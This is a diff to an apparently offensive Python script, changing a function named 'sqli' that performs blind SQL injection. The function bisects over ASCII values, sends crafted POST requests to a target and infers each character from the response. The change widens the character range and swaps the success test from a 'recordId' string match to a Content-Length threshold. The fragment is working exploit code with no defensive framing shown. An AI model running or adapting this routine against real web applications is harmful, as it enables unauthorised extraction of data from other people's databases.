@@ -5,7 +5,7 @@ import argparse
 # SQLI execution
 def sqli(inj_str):
     min = start = 32
-    max = end = 125
+    max = end = 126
 
     for j in range(1,100): #Loop over ASCII values
         #Applying bisection search algorithm
@@ -14,7 +14,9 @@ def sqli(inj_str):
             inj = inj_str.replace("[CHAR]", op+str(g))
             data = entry_point.replace("[INJ]", inj)
             r = requests.post(target, data=data, headers=headers)
-            if ("recordId" in r.text):
+            content_length = int(r.headers['Content-Length'])
+            if (content_length > 20):
+            #if ("recordId" in r.text):
                 if op == ">": min = g
                 elif op == "<": max = g
                 elif op == "=": return int(g)
